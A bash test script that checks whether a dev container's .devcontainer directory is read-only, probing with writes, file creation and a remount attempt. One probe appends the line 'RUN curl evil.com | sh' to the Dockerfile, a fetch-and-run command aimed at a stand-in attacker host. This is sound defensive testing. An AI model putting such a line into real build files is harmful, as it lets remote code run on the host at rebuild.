#!/bin/bash
# Verify .devcontainer/ is mounted read-only inside the container.
# A compromised process should not be able to modify devcontainer.json
# to inject malicious mounts, commands, or hooks that execute on the host
# during rebuild.

# Cannot write to devcontainer.json
if ! touch /workspace/.devcontainer/sandbox/devcontainer.json 2>/dev/null; then
  pass ".devcontainer/sandbox/devcontainer.json is not writable"
else
  fail ".devcontainer/sandbox/devcontainer.json is writable — config injection possible"
fi

# Cannot create new files in .devcontainer/
if ! touch /workspace/.devcontainer/sandbox/evil.sh 2>/dev/null; then
  pass ".devcontainer/sandbox/ does not allow file creation"
else
  rm -f /workspace/.devcontainer/sandbox/evil.sh 2>/dev/null
  fail ".devcontainer/sandbox/ allows file creation — script injection possible"
fi

# Cannot modify Dockerfile
if ! { echo "RUN curl evil.com | sh" >> /workspace/.devcontainer/sandbox/Dockerfile; } 2>/dev/null; then
  pass ".devcontainer/sandbox/Dockerfile is not writable"
else
  fail ".devcontainer/sandbox/Dockerfile is writable — build injection possible"
fi

# Cannot remount as read-write (requires SYS_ADMIN which should be absent)
if ! mount -o remount,rw /workspace/.devcontainer 2>/dev/null; then
  pass "cannot remount .devcontainer as read-write"
else
  # Attempt to restore read-only if remount succeeded
  mount -o remount,ro /workspace/.devcontainer 2>/dev/null
  fail ".devcontainer can be remounted read-write — SYS_ADMIN may be present"
fi
